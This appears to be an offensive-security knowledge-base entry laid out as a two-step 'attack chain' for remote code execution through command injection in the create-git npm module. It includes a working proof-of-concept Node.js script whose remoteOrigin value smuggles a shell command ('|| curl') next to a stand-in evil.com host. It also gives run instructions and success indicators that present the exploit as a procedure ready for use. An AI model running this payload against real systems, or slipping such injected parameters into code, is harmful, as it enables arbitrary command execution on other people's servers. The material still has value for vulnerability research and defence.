---
id: ac-rce-create-git-injection
tags:
  - rce
  - command-injection
  - node-js
  - npm
type: attack_chain
tools:
  - '[[tools/create-git]]'
  - '[[tools/child_process-exec]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Node.js
  - JavaScript
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Command-Injection-in-create-git]]'
step_count: 2
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:19.654Z'
description: >-
  Multi-stage attack exploiting command injection in the create-git NPM module
  to achieve remote code execution on Node.js applications.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# RCE in create-git NPM Module via Command Injection

Multi-stage attack chain demonstrating remote code execution through command injection in the vulnerable create-git NPM module, allowing arbitrary system command execution on the host running the Node.js application.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~1 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Load Vulnerable Module] --> B[Inject Malicious Payload]
    B --> C[Execute Arbitrary Commands]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/create-git]]
- Node.js environment

### Target Environment

- Node.js runtime (any version compatible with create-git)
- NPM installed for module loading
- No specific services or ports required; targets internal Node.js applications using the module

### Initial Access Requirements

- Access to run Node.js scripts on the target host
- No credentials needed if running in a development or misconfigured environment
- Prior access to the application codebase or runtime

## Detailed Attack Procedures

### Step 1: Load Vulnerable Module
procedure: [[procedures/Exploit-Command-Injection-in-create-git]]

**Objective**: Import and prepare the vulnerable create-git module for exploitation.

**Instructions**: Create a Node.js script and require the create-git module to load its functionality for git repository creation.

Use the following code to import the module:

```javascript
// poc.js
const createGit = require('create-git');
```

**Expected Output**: Module loads without errors, ready for function invocation.

**Success Indicators**:
- No import errors in Node.js console
- createGit function available in script scope

### Step 2: Inject Malicious Payload and Execute
procedure: [[procedures/Exploit-Command-Injection-in-create-git]]

**Objective**: Pass unsanitized user input to trigger command injection and execute arbitrary shell commands.

**Instructions**: Invoke the createGit function with a malicious remoteOrigin parameter that includes shell operators to inject commands. For example, set remoteOrigin to a payload like 'http://evil.com || curl "http://localhost/RCE"'.

Execute the full PoC script using [[commands/node-poc-create-git-injection]]:

```javascript
// Full PoC execution
const createGit = require('create-git');
createGit({
  ignoreExisting: true,
  initialCommitMessage: 'test',
  remoteOrigin: 'http://evil.com || curl "http://localhost/RCE"',
  ignoreTemplates: ['Node.gitignore']
});
```

Run with Node.js:

```bash
node poc.js
```

**Expected Output**: Normal git operations complete, followed by execution of the injected curl command, potentially fetching or sending data to the attacker's server.

**Success Indicators**:
- Injected command (e.g., curl) executes successfully
- Evidence of RCE, such as network traffic to localhost/RCE or file changes on the host

## Attack Chain Summary

### Key Achievements

1. Successful loading of the vulnerable create-git module
2. Command injection via remoteOrigin parameter leading to arbitrary shell execution
3. Full server compromise potential through RCE

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
